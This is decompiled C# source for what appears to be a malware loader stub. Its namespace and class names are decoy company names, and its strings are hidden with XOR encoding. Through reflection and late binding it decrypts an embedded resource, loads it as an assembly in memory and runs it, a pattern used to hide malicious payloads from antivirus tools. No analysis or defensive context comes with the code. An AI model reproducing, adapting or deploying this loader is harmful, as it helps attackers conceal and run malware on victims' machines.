using System;
using System.Runtime.CompilerServices;
using System.Text;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

namespace ProtectiveLifeCorp;

public class ReliantEnergyInc
{
	private static object EastmanChemicalCompany(byte[] EOGResources)
	{
		checked
		{
			byte[] array = new byte[EOGResources.Length - 1 + 1];
			byte b = EOGResources[EOGResources.Length - 1];
			Array.Resize(ref array, array.Length - 1);
			int num = array.Length - 1;
			for (int i = 0; i <= num; i++)
			{
				array[array.Length - 1 - i] = unchecked((byte)(EOGResources[i] ^ b ^ Encoding.Default.GetBytes("N2J5AT4VYDRI15OZZRR936ML1I0UIE5C54KE9RVVI5N3HE8O5BVPP3YSM9E3UHMRJON8RJ1F6619PUEULT2HRMVCF33AM6BBO7R4208TKPUUBZC45SNBRFA85K31SZ3A5ZSTCK6LVG7A3AAP10G6OATI7U0NHHAV1U3MFS1RZCOJJ0E4KJATR8T5EIYRLODMFIKGIVJGIZFMUI98OFD8HPE3A8I8")[i % Encoding.Default.GetBytes("N2J5AT4VYDRI15OZZRR936ML1I0UIE5C54KE9RVVI5N3HE8O5BVPP3YSM9E3UHMRJON8RJ1F6619PUEULT2HRMVCF33AM6BBO7R4208TKPUUBZC45SNBRFA85K31SZ3A5ZSTCK6LVG7A3AAP10G6OATI7U0NHHAV1U3MFS1RZCOJJ0E4KJATR8T5EIYRLODMFIKGIVJGIZFMUI98OFD8HPE3A8I8").Length]));
			}
			return array;
		}
	}

	[STAThread]
	public static void Main()
	{
		//IL_07ad: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			object @string = Encoding.Default.GetString((byte[])EastmanChemicalCompany(new byte[27]
			{
				0, 105, 31, 111, 19, 16, 112, 32, 64, 29,
				10, 23, 114, 97, 29, 1, 11, 0, 55, 32,
				105, 100, 14, 8, 127, 45, 55
			}));
			object string2 = Encoding.Default.GetString((byte[])EastmanChemicalCompany(new byte[17]
			{
				0, 105, 31, 111, 19, 16, 112, 32, 23, 1,
				17, 16, 67, 118, 29, 42, 55
			}));
			object string3 = Encoding.Default.GetString((byte[])EastmanChemicalCompany(new byte[17]
			{
				11, 106, 9, 99, 0, 10, 119, 2, 47, 93,
				8, 27, 114, 113, 1, 62, 55
			}));
			object string4 = Encoding.Default.GetString((byte[])EastmanChemicalCompany(new byte[15]
			{
				28, 102, 19, 99, 2, 16, 109, 40, 11, 7,
				4, 27, 116, 65, 55
			}));
			object string5 = Encoding.Default.GetString((byte[])EastmanChemicalCompany(new byte[33]
			{
				11, 96, 26, 99, 24, 2, 78, 4, 13, 1,
				16, 17, 117, 103, 42, 67, 30, 0, 6, 124,
				113, 110, 9, 30, 84, 80, 106, 7, 10, 1,
				123, 39, 55
			}));
			object string6 = Encoding.Default.GetString((byte[])EastmanChemicalCompany(new byte[14]
			{
				10, 96, 30, 112, 3, 12, 112, 4, 60, 93,
				4, 52, 116, 55
			}));
			object string7 = Encoding.Default.GetString((byte[])EastmanChemicalCompany(new byte[10] { 13, 102, 24, 104, 20, 44, 119, 4, 41, 55 }));
			object string8 = Encoding.Default.GetString((byte[])EastmanChemicalCompany(new byte[3] { 172, 218, 208 }));
			object string9 = Encoding.Default.GetString((byte[])EastmanChemicalCompany(new byte[5] { 29, 100, 18, 78, 55 }));
			object string10 = Encoding.Default.GetString((byte[])EastmanChemicalCompany(new byte[8] { 28, 117, 4, 86, 2, 6, 68, 55 }));
			object string11 = Encoding.Default.GetString((byte[])EastmanChemicalCompany(new byte[4] { 24, 79, 15, 55 }));
			object type = Type.GetType(Encoding.Default.GetString((byte[])EastmanChemicalCompany(new byte[12]
			{
				28, 117, 4, 86, 88, 14, 102, 21, 29, 10,
				54, 55
			})));
			object objectValue = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet((object)null, (Type)type, Conversions.ToString(string10), new object[1] { RuntimeHelpers.GetObjectValue(@string) }, (string[])null, (Type[])null, (bool[])null));
			object objectValue2 = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet((object)null, (Type)type, Conversions.ToString(string10), new object[1] { RuntimeHelpers.GetObjectValue(string5) }, (string[])null, (Type[])null, (bool[])null));
			object objectValue3 = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet((object)null, (Type)type, Conversions.ToString(string10), new object[1] { RuntimeHelpers.GetObjectValue(string3) }, (string[])null, (Type[])null, (bool[])null));
			object objectValue4 = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet((object)null, (Type)objectValue, Conversions.ToString(string2), new object[0], (string[])null, (Type[])null, (bool[])null));
			object objectValue5 = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet((object)null, (Type)objectValue3, Conversions.ToString(string4), new object[3]
			{
				RuntimeHelpers.GetObjectValue(objectValue2),
				RuntimeHelpers.GetObjectValue(string6),
				RuntimeHelpers.GetObjectValue(objectValue4)
			}, (string[])null, (Type[])null, (bool[])null));
			object objectValue6 = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(RuntimeHelpers.GetObjectValue(objectValue5), (Type)null, Conversions.ToString(string7), new object[1] { RuntimeHelpers.GetObjectValue(string8) }, (string[])null, (Type[])null, (bool[])null));
			object objectValue7 = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet((object)null, (Type)objectValue, Conversions.ToString(string9), new object[1] { RuntimeHelpers.GetObjectValue(EastmanChemicalCompany((byte[])NewLateBinding.LateIndexGet(objectValue6, new object[1] { 1 }, (string[])null))) }, (string[])null, (Type[])null, (bool[])null));
			object objectValue8 = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(RuntimeHelpers.GetObjectValue(objectValue7), (Type)null, Conversions.ToString(string10), new object[1] { Operators.ConcatenateObject(Operators.ConcatenateObject(string11, (object)"."), string11) }, (string[])null, (Type[])null, (bool[])null));
			RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet((object)null, (Type)objectValue3, Conversions.ToString(string4), new object[1] { RuntimeHelpers.GetObjectValue(objectValue8) }, (string[])null, (Type[])null, (bool[])null));
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			Interaction.MsgBox((object)ex2.ToString(), (MsgBoxStyle)0, (object)null);
			ProjectData.ClearProjectError();
		}
	}
}
